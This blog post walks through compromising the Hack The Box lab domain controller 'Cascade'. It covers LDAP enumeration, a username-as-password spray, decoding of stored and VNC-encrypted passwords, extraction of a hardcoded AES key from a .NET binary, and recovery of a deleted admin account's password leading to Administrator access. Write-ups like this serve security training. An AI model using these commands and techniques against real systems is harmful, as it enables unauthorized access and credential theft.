---
layout: post
title: HTB - cascade
date: 2025-05-15 09:45 -0400
---

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2025-05-06 09:35 -04
Nmap scan report for 10.10.10.182
Host is up (0.16s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-06 13:35:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-06T13:36:19
|_  start_date: 2025-05-06T13:33:07
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.42 seconds
```

domain:
- cascade.local

nothing on udp

Anonymous login works for ldap. Will dump everything + bloodhound.

bloodhound doesn't want to work with anonymous login.

time to take the users and try `users:users` after cleaning up the names.
```bash
netexec smb $(cat ip.txt) -u users.txt -p users.txt --shares --continue-on-success --no-bruteforce
```

no luck. will explore users descriptions on ldap.
- CASC-DC1.cascade.local
- is the pc name I think

password not required gives a user. but it doesn't work
```bash
netexec ldap $(cat ip.txt) -u '' -p ''  --password-not-required
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
LDAP        10.10.10.182    389    CASC-DC1         [+] cascade.local\:
LDAP        10.10.10.182    389    CASC-DC1         User: a.turnbull Status: enabled
LDAP        10.10.10.182    389    CASC-DC1         User: CascGuest Status: disabled
```

checking every ldap attribute for something interesting:
```bash
for user in $(cat users_valid.txt); do echo $user;  netexec ldap $(cat ip.txt) -u '' -p '' --query "(sAMAccountName=$user)" ""; done
```

r.thompson has one: `cascadeLegacyPwd:    clk0bjVldmE= (rY4n5eva)`
now we get a tgt and try bloodhound

nothing much on it
![cascade1](/assets/img/cascade1.png)

smb looks more interesting:
```bash
~/workspace/projects/htb/cascade » netexec smb $(cat ip.txt) -u r.thompson -p 'rY4n5eva' --shares
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva
SMB         10.10.10.182    445    CASC-DC1         [*] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share
----------------------------------------------------------------------------------------------------------------
```

Can't read stuff for some reason.

try same password on every user. Didn't work.

It was skill issue, now I can read stuff:
```bash
smbclient -U 'casc-dc1.cascade.local/r.thompson%rY4n5eva' "//Casc-DC1.cascade.local/Data"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jan 26 23:27:34 2020
  ..                                  D        0  Sun Jan 26 23:27:34 2020
  Contractors                         D        0  Sun Jan 12 21:45:11 2020
  Finance                             D        0  Sun Jan 12 21:45:06 2020
  IT                                  D        0  Tue Jan 28 14:04:51 2020
  Production                          D        0  Sun Jan 12 21:45:18 2020
  Temps                               D        0  Sun Jan 12 21:45:15 2020
```

Available files:

- "IT/Email Archives/Meeting_Notes_June_2018.html"
- "IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log"
- "IT/Logs/DCs/dcdiag.log"
- "IT/Temp/s.smith/VNC Install.reg"

TODO:
way to crawl smb filtering by filesize and downloading it

Some interesting stuff, ben plays too much.
![cascade2](/assets/img/cascade2.png)

`Username is TempAdmin (password is the same as the normal admin account password).`

There is a password on `VNC Install.reg`. Maybe the password is the literal hex? since some chars are outside ascii range
```bash
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f ()
```

Doesn't seem to work.

Actually the password is encrypted and you can decrypt with `vncpasswd.py`
```bash
~/workspace/projects/htb/cascade » docker run -v ./:/app/ -ti trinitronx/vncpasswd.py -d -H '6bcf2a4b6e5aca0f'Decrypted Bin Pass= 'sT333ve2'
Decrypted Hex Pass= '7354333333766532'
```

password works for s.smith:
```bash
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2
```

and he has winrm access
![cascade3](/assets/img/cascade3.png)

```bash
*Evil-WinRM* PS C:\Users\s.smith\Desktop> type user.txt
dfe61***************************
```

We probably need to recover the TempAdmin from bin, maybe use internal vnc. Will do my enum anyway.
Nothing interesting on the machine.

Steve can read the 'Audit$'. Some reversing maybe?
```bash
~/workspace/projects/htb/cascade » smbclient -U 'casc-dc1.cascade.local/s.smith%sT333ve2' "//Casc-DC1.cascade.local/Audit$"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 29 14:01:26 2020
  ..                                  D        0  Wed Jan 29 14:01:26 2020
  CascAudit.exe                      An    13312  Tue Jan 28 17:46:51 2020
  CascCrypto.dll                     An    12288  Wed Jan 29 14:00:20 2020
  DB                                  D        0  Tue Jan 28 17:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 19:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 02:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 02:38:38 2019
  x64                                 D        0  Sun Jan 26 18:25:27 2020
  x86                                 D        0  Sun Jan 26 18:25:27 2020
```

arksvc password
```bash
sqlite> select * from Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

outside ascii, maybe its also encrypted?
will have to check the .exe

ILSpy looks awful on linux. But we have the whole decryption flow here.
- key: c4scadek3y654321
- iv: 1tdyjCbY1Ix49842
![ILSpy 1](/assets/img/cascade4.png)
![ILSpy 2](/assets/img/cascade5.png)

password: w3lc0meFr31nd

arksvc has access to the ad recycle bin, so we can recover TempAdmin. But how to get its password?
![bloodhound](/assets/img/cascade7.png)

turns out it has a cascadeLegacyPwd also:
```bash
Get-ADObject -Filter 'sAMAccountName -eq "TempAdmin"' -IncludeDeletedObjects -Properties *
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz (baCT3r1aN00dles)
```

so this should be the admin password according to the meeting thingy.

```bash
~/workspace/projects/htb/cascade » evil-winrm -i $(cat ip.txt) -u 'Administrator' -p 'baCT3r1aN00dles'
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
7e03f***************************
```
